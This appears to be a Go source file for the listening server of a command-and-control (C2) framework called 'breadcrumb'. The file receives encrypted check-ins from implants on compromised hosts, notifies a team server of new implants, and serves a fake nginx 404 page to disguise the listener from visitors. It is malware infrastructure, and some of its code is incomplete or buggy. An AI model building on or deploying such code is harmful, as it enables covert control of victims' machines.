/*
	The bread loaf is the server of the breadcrumb C2. The load will have implants named 'slices'. Each user will be a
	crumb
*/

package ListeningServer

import (
	"AllSecure/ListeningServer/Common"
	"AllSecure/TeamServer/Crypt"
	"AllSecure/TeamServer/implant"
	"context"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
)

var (
	agent_arr        []implant.Agent
	ListeningServers []Common.ListeningServer
	g_clientobj      Common.Client
)

func ProcessRequest(c *gin.Context) {

	body, err := io.ReadAll(c.Request.Body)
	if err != nil {
		panic(err)
	}
	defer c.Request.Body.Close()

	var data_package Common.Package
	err = data_package.UnmarshalBinary(body)
	if err != nil {
		log.Println("[Error] attempting to read data from http request", err)
		c.JSON(http.StatusInternalServerError, "Internal Server Error")
	}

	for _, byte := range data_package.EncryptedAESKey {
		fmt.Printf("0x%02X ", byte)
	}
	log.Println("Size of the Encrypted AESKey: ", data_package.EncryptedAESKeySize)

	err = Crypt.DecryptAESKey(data_package.EncryptedAESKey, data_package.EncryptedAESKeySize,
		"C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
	if err != nil {
		c.JSON(http.StatusMovedPermanently, DenyRequest)
	}
	//TODO: retrieve the implant data from implant itself, process it & send event to team server.

	err = SendEvent("NewImplant")
	if err != nil {
		c.JSON(http.StatusInternalServerError, "Internal Server Error")
	}

}
func DenyRequest(c *gin.Context) {
	c.Writer.WriteHeader(http.StatusNotFound)
	html, err := os.ReadFile("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\ListeningServer\\Assets\\NotFound.html")
	if err != nil {
		log.Println("Could not load not found html file")
	}
	c.Header("Server", "nginx")
	c.Header("Content-Type", "text/html")
	c.Writer.Write(html)
}

func Start(Server Common.NewListener) error {

	go func() {
		err := StartEventHandler(Server.Jwttoken, Server.TSAddr+Server.TSPort)
		if err != nil {
			log.Println("[error] attempting to start event handler", err)
			return
		}
	}()

	var err error
	var TempServer Common.ListeningServer

	TempServer = Common.ListeningServer{
		Config: &Common.HTTPServerConfig{
			Name:         Server.ListenerName,
			KillDate:     0,
			WorkingHours: "",
			Method:       "",
			Port:         Server.Port,
			Secure:       Server.Secure,
			Address:      Server.Address,
		},
		GinEngine: Server.Engine,
		Server:    &http.Server{Addr: Server.Address + ":" + strconv.Itoa(Server.Port), Handler: Server.Engine},
		TLS:       Common.TLSConfig{Key: Server.Key, Cert: Server.Cert, CertPath: Server.Path + "\\ListeningServer\\Assets\\server_" + Server.ListenerName + ".cert", KeyPath: Server.Path + "\\ListeningServer\\Assets\\server_" + Server.ListenerName + ".key"},
		Active:    true,
	}

	if len(ListeningServers) > 0 {
		for _, server := range ListeningServers {
			if server.Config.Port == Server.Port && server.Config.Address == Server.Address && server.Active == true && server.Config.Name == Server.ListenerName {
				log.Println("[error] the server is already started and listening on the desired location", Server.Address, Server.Port)
				return errors.New("[error] server has already been started")
			}
		}
	}

	ListeningServers = append(ListeningServers, TempServer)

	for _, server := range ListeningServers {

		if server.Active && server.Config.Address == Server.Address && server.Config.Port == Server.Port && server.Config.Name == Server.ListenerName {

			server.GinEngine.POST("/*endpoint", ProcessRequest)
			server.GinEngine.GET("/*endpoint", DenyRequest)

			if server.Config.Secure == true {

				err = os.WriteFile(server.TLS.CertPath, Server.Cert, 0644)
				if err != nil {
					log.Fatalln("[error] Failed to save certificate", err)
				}
				err = os.WriteFile(server.TLS.KeyPath, Server.Key, 0644)
				if err != nil {
					log.Fatalln("[error] Failed to save key path", err)
				}

				if err = server.GinEngine.RunTLS(server.Config.Address+":"+strconv.Itoa(server.Config.Port), server.TLS.CertPath, server.TLS.KeyPath); err != nil {
					log.Fatalln("[error] failed to start websocket: ", err)
				}

			} else {
				err = server.Server.ListenAndServe()
				if err != nil {
					log.Println("[error] attempting to launch listening server", err)
					return err
				}
			}
		}
	}

	return nil
}

func Stop(ListenerName, address, path string, port int) bool {
	var err error
	ctx, cancel := context.WithTimeout(context.Background(), 0)
	defer cancel()
	for _, server := range ListeningServers {
		if server.Config.Address == address && server.Config.Port == port && server.Active == true && server.Config.Name == ListenerName {

			if err = server.Server.Close(); err != nil {
				log.Println("[error] attempting to close connections")
				return false
			}
			if err = server.Server.Shutdown(ctx); err != nil {

				log.Println("[error] server shutdown failed: ", err)
				return false
			}
			err = os.Remove(path + "\\ListeningServer\\Assets\\server_" + ListenerName + ".cert")
			if err != nil {
				log.Println("[error] attempting to delete the server certificate file", err)
			}
			err = os.Remove(path + "\\ListeningServer\\Assets\\server_" + ListenerName + ".key")
			if err != nil {
				log.Println("[error] attempting to delete the server key file", err)
			}
			return true
		}
	}
	return false
}
